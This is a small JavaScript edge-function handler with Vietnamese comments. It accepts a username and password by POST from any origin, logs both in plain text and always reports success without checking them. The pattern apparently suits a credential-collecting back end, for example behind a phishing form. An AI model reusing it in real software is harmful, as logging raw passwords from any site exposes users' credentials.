export const config = {
  runtime: 'edge',
};

export default async function handler(req) {
  const { method } = req;

  // Kiểm tra phương thức OPTIONS để xử lý CORS
  if (method === 'OPTIONS') {
    return new Response(null, {
      status: 204,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
    });
  }

  // Kiểm tra phương thức POST
  if (method === 'POST') {
    try {
      const { username, password } = await req.json();
      console.log('Nhận form:', { username, password });

      return new Response(JSON.stringify({ success: true }), {
        status: 200,
        headers: {
          'Access-Control-Allow-Origin': '*',
        },
      });
    } catch (error) {
      console.error('Lỗi khi xử lý dữ liệu:', error);
      return new Response('Bad Request', { status: 400 });
    }
  }

  // Nếu không phải là POST hoặc OPTIONS
  return new Response('Method Not Allowed', { status: 405 });
}
